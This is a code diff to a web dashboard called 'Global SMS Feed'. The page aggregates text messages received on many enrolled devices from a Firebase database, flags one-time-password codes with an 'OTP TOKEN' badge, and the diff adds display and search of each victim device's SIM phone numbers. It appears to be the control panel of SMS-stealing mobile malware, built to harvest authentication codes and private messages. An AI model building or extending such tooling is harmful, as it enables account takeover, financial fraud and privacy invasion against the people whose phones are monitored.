@@ -34,9 +34,10 @@
         .sms-card:hover { border-color: #58a6ff; }
         .sms-card.otp-alert { border-left: 4px solid #db8e2f; background: linear-gradient(145deg, #1f1b16, #161b22); }
         .otp-badge { background: #db8e2f; color: #0a0e14; font-size: 10px; padding: 1px 6px; border-radius: 4px; font-weight: bold; margin-left: 6px; }
-        .meta-row { display: flex; justify-content: space-between; margin-bottom: 6px; font-size: 13px; }
-        .sender-info { font-weight: 600; color: #58a6ff; display: flex; align-items: center; gap: 6px; }
+        .meta-row { display: flex; justify-content: space-between; margin-bottom: 6px; font-size: 13px; flex-wrap: wrap; gap: 6px; }
+        .sender-info { font-weight: 600; color: #58a6ff; display: flex; align-items: center; gap: 6px; flex-wrap: wrap; }
         .device-tag { font-size: 10px; color: #8b949e; background: #21262d; padding: 1px 6px; border-radius: 4px; font-family: monospace; }
+        .number-tag { font-size: 10px; color: #58a6ff; background: #1c2333; padding: 1px 6px; border-radius: 4px; font-family: monospace; border: 1px solid #30363d; }
         .timestamp { color: #8b949e; font-size: 11px; }
         .message-body { font-size: 14px; line-height: 1.5; color: #e6edf3; white-space: pre-wrap; word-break: break-word; }
         .highlighter { background: rgba(219, 142, 47, 0.2); color: #f0f6fc; border-bottom: 2px dashed #db8e2f; padding: 0 2px; font-family: monospace; font-weight: bold; }
@@ -52,12 +53,12 @@
                 <a href="index.html" class="back-btn">← Dashboard</a>
                 <div class="title">📨 Global SMS Feed</div>
             </div>
-            <span id="liveBadge" class="badge live">🟢 Live Sync</span>
+            <span id="liveBadge" class="badge live">Establishing Connection...</span>
             <span class="badge">Total Logged: <span id="feedCount">0</span></span>
         </div>
 
         <div class="controls">
-            <input type="text" id="feedSearch" class="search-input" placeholder="Search by sender, keyword, or device description..." />
+            <input type="text" id="feedSearch" class="search-input" placeholder="Search by sender, number, keyword, or device description..." />
         </div>
 
         <div id="feedContainer">
@@ -99,6 +100,22 @@
             });
         }
 
+        function extractNumbers(simInfo) {
+            const nums = new Set();
+            if (!simInfo) return [];
+            ['sim1', 'sim2'].forEach(slot => {
+                if (simInfo[slot]?.number) {
+                    let n = simInfo[slot].number.trim().replace(/[\s\-\(\)]/g, '').replace(/^\+?91/, '');
+                    if (n && n.length >= 10) nums.add(n);
+                }
+            });
+            if (simInfo.number) {
+                let n = simInfo.number.trim().replace(/[\s\-\(\)]/g, '').replace(/^\+?91/, '');
+                if (n && n.length >= 10) nums.add(n);
+            }
+            return Array.from(nums);
+        }
+
         function highlightKeywords(text) {
             if (!text) return { html: '', isOtp: false };
             const otpRegex = /\b([0-9]{4,6})\b/;
@@ -118,7 +135,7 @@
             return div.innerHTML;
         }
 
-        // Persistent Socket Listener Hook
+        // Real-Time Socket Sync Connection
         onValue(usersRef, (snapshot) => {
             try {
                 const usersTree = snapshot.val();
@@ -128,11 +145,17 @@
                     for (const [deviceId, deviceProfile] of Object.entries(usersTree)) {
                         if (deviceProfile?.receivedSms) {
                             const label = deviceProfile.deviceInfo?.model || deviceId.slice(0,8);
+                            
+                            // Extract the list of clean numbers allocated to this device slot profile
+                            const deviceNumbers = extractNumbers(deviceProfile.simInfo);
+                            const displaysNumber = deviceNumbers.length > 0 ? deviceNumbers.join(' / ') : 'No SIM';
+
                             for (const [smsId, smsItem] of Object.entries(deviceProfile.receivedSms)) {
                                 consolidatedList.push({
                                     id: smsId,
                                     deviceId: deviceId,
                                     deviceLabel: label,
+                                    receivingNumber: displaysNumber,
                                     sender: smsItem.sender || 'Unknown',
                                     message: smsItem.message || '',
                                     timestamp: smsItem.timestamp || 0
@@ -142,7 +165,7 @@
                     }
                 }
 
-                // Sequence chronologically: Newest message drops straight to the top
+                // Sort chronologically: Newest message drops straight to the top
                 consolidatedList.sort((a, b) => b.timestamp - a.timestamp);
                 allMessages = consolidatedList;
                 feedCount.textContent = allMessages.length;
@@ -170,7 +193,8 @@
                 m.sender.toLowerCase().includes(query) || 
                 m.message.toLowerCase().includes(query) || 
                 m.deviceId.toLowerCase().includes(query) || 
-                m.deviceLabel.toLowerCase().includes(query)
+                m.deviceLabel.toLowerCase().includes(query) ||
+                m.receivingNumber.toLowerCase().includes(query)
             );
 
             if (filtered.length === 0) {
@@ -191,7 +215,8 @@
                     <div class="meta-row">
                         <span class="sender-info">
                             📨 ${escapeHtml(msg.sender)} 
-                            <span class="device-tag">📱 ${escapeHtml(msg.deviceLabel)}</span>
+                            <span class="device-tag" title="Device ID: ${msg.deviceId}">📱 ${escapeHtml(msg.deviceLabel)}</span>
+                            <span class="number-tag">📞 ${escapeHtml(msg.receivingNumber)}</span>
                             ${parsed.isOtp ? '<span class="otp-badge">OTP TOKEN</span>' : ''}
                         </span>
                         <span class="timestamp">${formatTimestamp(msg.timestamp)}</span>
